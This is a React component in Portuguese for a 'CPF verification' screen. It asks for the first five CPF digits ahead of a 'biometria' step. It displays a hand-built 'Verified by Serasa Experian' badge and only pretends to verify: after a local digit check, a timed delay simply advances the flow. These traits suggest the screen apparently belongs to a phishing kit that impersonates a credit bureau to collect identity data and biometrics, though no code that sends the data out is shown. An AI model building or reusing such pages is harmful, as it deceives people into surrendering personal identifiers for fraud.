
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { validatePartialCPF } from "@/utils/validation/cpfValidation";
import ReCAPTCHA from "react-google-recaptcha";
import { Lock } from 'lucide-react';

interface CpfVerificationStepProps {
  onNext: () => void;
}

export const CpfVerificationStep = ({
  onNext
}: CpfVerificationStepProps) => {
  const [cpfDigits, setCpfDigits] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [captchaValue, setCaptchaValue] = useState<string | null>(null);
  const {
    toast
  } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cpfDigits || cpfDigits.length < 5) {
      toast({
        title: "CPF inválido",
        description: "Por favor, insira os primeiros 5 dígitos do seu CPF/CNPJ.",
        variant: "destructive"
      });
      return;
    }
    if (!captchaValue) {
      toast({
        title: "Verificação necessária",
        description: "Por favor, complete a verificação reCAPTCHA.",
        variant: "destructive"
      });
      return;
    }
    try {
      setIsLoading(true);
      if (!validatePartialCPF(cpfDigits)) {
        throw new Error("Os dígitos do CPF não são válidos.");
      }
      await new Promise(resolve => setTimeout(resolve, 800));
      onNext();
    } catch (error: any) {
      toast({
        title: "Erro na verificação",
        description: error.message || "Ocorreu um erro ao verificar o CPF.",
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-white text-gray-800 flex flex-col min-h-screen">
      <div className="flex-1 flex items-start justify-center pt-10 p-6">
        <div className="w-full max-w-[280px] bg-transparent rounded-lg space-y-3">
          <h2 className="text-xs font-bold text-gray-800 max-w-[280px] mx-auto text-center">
            Olá, verificamos que você está realizando a
            <br />
            consulta/contratação dos nossos serviços SmartVoz.
            <br />
            Para dar continuidade precisamos realizar a sua biometria.
          </h2>

          <p className="text-xs text-gray-600 text-center mt-2 max-w-[280px] mx-auto">
            Biometria é uma solução que utiliza a tecnologia para identificação do cliente.
          </p>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div className="space-y-2">
              <label htmlFor="cpf" className="block text-xs font-bold text-center text-gray-800">
                Insira os primeiros 5 dígitos do seu CPF:
              </label>
              <Input 
                id="cpf" 
                type="text" 
                value={cpfDigits} 
                onChange={e => {
                  const value = e.target.value.replace(/\D/g, '').slice(0, 5);
                  setCpfDigits(value);
                }} 
                placeholder="" 
                className="w-full h-9 text-black text-center text-base bg-white border border-gray-300" 
                maxLength={5} 
              />
            </div>

            <div className="flex justify-center">
              <ReCAPTCHA 
                sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" 
                onChange={value => setCaptchaValue(value)} 
                theme="light" 
                style={{
                  transform: "scale(0.85)",
                  transformOrigin: "center center"
                }} 
              />
            </div>

            <div className="flex justify-center mt-4">
              <div className="flex flex-col items-center bg-transparent px-4 py-2 rounded-lg">
                <div className="flex items-center">
                  <div className="h-5 w-[1px] bg-gray-400 mr-2"></div>
                  <Lock className="w-5 h-5 text-gray-600" strokeWidth={2.5} />
                </div>
                <div className="text-center ml-[6px]">
                  <span className="text-sm text-[#8425af] block">Verified by</span>
                  <span className="font-semibold text-sm text-gray-800 ml-8 -mt-[2px]">Serasa Experian</span>
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>

      {/* Botão fixado na parte inferior */}
      <div className="fixed bottom-0 left-0 right-0 bg-white">
        <Button 
          onClick={handleSubmit} 
          disabled={isLoading || !captchaValue || cpfDigits.length < 5} 
          className="w-full h-12 bg-[#8425af] text-white hover:bg-[#7a1fa2] font-medium uppercase text-base tracking-wider rounded-none"
        >
          {isLoading ? "VALIDANDO..." : "VALIDAR"}
        </Button>
      </div>
    </div>
  );
};

export default CpfVerificationStep;
